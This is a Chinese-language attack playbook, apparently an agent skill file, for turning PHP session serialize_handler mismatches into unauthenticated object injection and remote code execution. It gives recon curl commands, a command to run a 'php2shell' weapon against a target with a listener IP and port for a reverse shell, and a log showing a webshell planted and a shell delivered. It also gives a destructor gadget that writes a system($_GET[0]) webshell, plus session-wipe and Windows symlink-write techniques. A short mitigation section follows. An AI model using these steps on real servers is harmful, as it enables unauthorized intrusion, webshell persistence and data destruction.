---
name: php-session-handler-gap-rce
description: Use when PHP session serialize_handler differs per-dir/vhost — unauth object injection → RCE (CVE-2026-115560 class).
---

# PHP session 处理器错配 → 未授权对象注入 → RCE（存活于 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35）

> 来源：`github.com/ACD421/PHP` zero1（@acd421，2026-10-21）。这是**纯逻辑 bug**，ASAN 干净，和
> CVE-2026-109618/109619 的内存类正交——那批补丁打完了，这批**一个没修**（advisory-only，CVE-2026-115560）。

## 0. 一句话

session 的**写路径**和**读路径**用了不同 `serialize_handler`（`php` vs `php_serialize`），攻击者就获得
「往被 `php` 解码器当对象读的位置塞任意序列化串」的能力；而 `session_start()` 解码失败时**照样会
析构已构造的对象** → `__destruct` 直接跑。**任何 PHP 版本都成立**，只要配置分叉存在。

## 1. 三个原语（从强到弱）

### A. handler 错配 → 对象注入 → RCE（CVSS 8.1）

- 形成条件：同一应用里写/读 `session.serialize_handler` 不一致 —— 常见于
  `php_value session.serialize_handler php_serialize` 按目录（`.htaccess` / vhost `<Directory>`）、
  `ini_set()` 只在某些路由生效、老代码 `session_start()` 前手动 ini_set、多应用共享 `save_path`。
- 写入侧若是 `php_serialize`，session 文件内容是 `a:1:{s:3:"key";s:N:"<攻击者串>";}`；
  读侧用 `php` 解码器 → `s:N:"..."` 的**值**被当作「`<key>|<serialized>`」再拆一次 → 攻击者的 `O:…` 变对象。
- 8.5 的 "Session has been destroyed" 硬化**挡不住**：销毁本身就调用攻击对象的 `__destruct()`
  （回执里满是 `session_start()` 内部栈打出的 fatal error），`__wakeup()` 也在构造期触发。
- 抬升：需要一个「有副作用的析构」gadget（写文件/发请求）。回执用文件写 gadget 落 `p2s_shell.php` → 弹 shell。

### B. `session.upload_progress` 键注入（rfc1867，脚本执行前）

- `php_session_rfc1867_callback`（8.5.12 `ext/session/session.c:3265-3269`）把
  `upload_progress_` + **`PHP_SESSION_UPLOAD_PROGRESS` 原始值**逐字节写进 session，**不过滤、脚本还没跑**。
- 写侧是 `php_serialize`（官方推荐的"现代配置"）、读侧 `php` → 攻击者键被 `serialize($_SESSION)` 打包，
  读回时按对象解。**默认 ini（cleanup=1、strict_mode=1）也能打**：慢速上传 + 并发读赢过 cleanup 竞争。
- 另有一个「反向」用法：把 session 文件写到 docroot（`save_path` 与站点目录重叠）→ 直接当 PHP 执行，**不需要 POP gadget**。

### C. 未授权 session-wipe（默认配置即可，CVSS 7.5）

- 单个未授权 multipart POST 就能把受害者 session 文件**截断到 0 字节**：先 open 再因非法键 reject，
  reject 路径调 `php_session_save_current_state`（`session.c:543`）写空串 → `ps_files_write` `ftruncate(0)`（strace 回执）。
- 特性（作者 2026-10-23 二轮 541-wipe/1.2M-decode 复测）：**8.1.x 静默无告警**（200 次全 0 字节、0 warning，日志检测无效，8.5.x 才 warn）·
  **ABORT-IMMUNE**（FILE_START 即提交，掐连接不回滚）· **FULL-DISK-IMMUNE**（0 字节写，磁盘满也成）·
  错配或预置 session 时升级为 **unlink**（DELETE）。

## 2. 侦察：确认 handler 分叉

```bash
# 1) 先看默认值
curl -s http://T/phpinfo.php | grep -i serialize_handler      # 或者泄露页/报错页
# 2) 写入一个自己的 session，读回来比对格式
curl -s -c /tmp/j -b /tmp/j http://T/login            # 拿 PHPSESSID
# 3) 直接看 session 文件（若 save_path 可读 / 有 LFI）
#    php 处理器:      key|s:5:"hello";
#    php_serialize:   a:1:{s:3:"key";s:5:"hello";}
```

目录级分叉常见位置：`.htaccess` 的 `php_value session.serialize_handler`、nginx `fastcgi_param`、
`<Directory>` 段、`ini_set('session.serialize_handler', ...)`、以及**同一 save_path 被多个 vhost 共用**。

## 3. 打（用仓库武器）

```bash
# 侦察 + 列链（sessgap 对任何 PHP 版本 VIABLE，只要配置分叉 + gadget）
python3 weapons/php2shell.py --target https://target/ --lhost <你的IP> --lport 1362
```

回执形态（作者公开 tunnel 实测，`live_tunnel_sessgap_public.log`）：

```
[sessgap] gadget injection (124B) -> writes /var/www/html/p2s_shell.php
[1] upload (key injection): HTTP 200
[2] read side (/read.php): 200 — gadget destructor should have written the shell
[+] WEBSHELL LIVE at https://<target>/p2s_shell.php
[+] RECEIPT: uid=33(www-data) ...
[3] revshell delivery: 200 → LIVE SESSION → uid=33(www-data) / www-data / PHP 8.5.11
```

自己构造时的最小件：
- 会话键里塞 `<serialized payload>`（B 原语用 `PHP_SESSION_UPLOAD_PROGRESS` 原值）；
- gadget 类：`__destruct(){ file_put_contents('/var/www/html/s.php','<?php system($_GET[0]);?>'); }`；
- 读侧触发：任何 `session_start()` 的页面（`/read.php` 也行），不需要登录。

## 4. Windows：`O_NOFOLLOW=0` → 未授权任意路径写 → webshell（CVSS 7.7）

- Windows 构建 `mod_files.c:85-90` 把 `O_NOFOLLOW` `#define` 成 **0**，且 `mod_files.c:194-207` 的
  uid 归属检查被 `#ifndef PHP_WIN32` 编掉 → session 打开**追随符号链接/硬链接**。
- 配合 C 原语的未授权 upload-progress 触发 → **任意路径 建/写/清 文件**；实测在 windows.php.net stock
  **8.5.12 与 8.1.34** 上落 webshell 并执行（`WP4_RCE_OK`，零权限，跨用户 SYSTEM 写）。
- Linux 侧同样手法**不通**：真实 `O_NOFOLLOW` → `ELOOP`，59/59 字节原样、无 truncate 无 unlink（作者自己证伪了 Linux 分支，别浪费时间）。

## 5. 判修复 / 缓解

- 上游：advisory-only（CVE-2026-115560），无补丁；PHP 只承认了「类」的问题。
- 应用侧有效：
  1. 全链路**统一** `session.serialize_handler`（推荐全 `php_serialize`），禁止 per-dir/vhost 分叉；
  2. `session.save_path` 与 docroot 物理隔离；`session.upload_progress.enabled=0`（不用上传进度就关）；
  3. 解码前校验 `key|payload` 语法，拒绝跨格式内容；
  4. Windows：升级到带 `O_NOFOLLOW` 语义的构建不现实 → 只能靠 save_path ACL + 关闭 upload_progress。

## 6. 坑

- 「`php` 处理器 pipe-in-key 写变体」在 **8.5.12 / 8.1.2-1ubuntu2.27 已关闭**（作者验过）；能打的是
  **错配**变体和 **`php_serialize` 写侧**。别拿已关的变体去报洞。
- 需要应用有「任意字符串进 `$_SESSION`」的位置（登录名、购物车备注、locale、flash 消息）——大多数应用都有。
- 会话文件无扩展名 → 走 include 的链要能不带后缀包含；`save_path` 在 docroot 时不需要。
- 打之前先确认不是 CDN 缓存的 302：错配分叉是**按目录**的，同一个域名不同路径可能配置不同。
- 该 repo 整体评价见 `php-var-destroy-uaf-rce` §3：作者这代工具本地可复现，别再按「lab-only」一概否定。
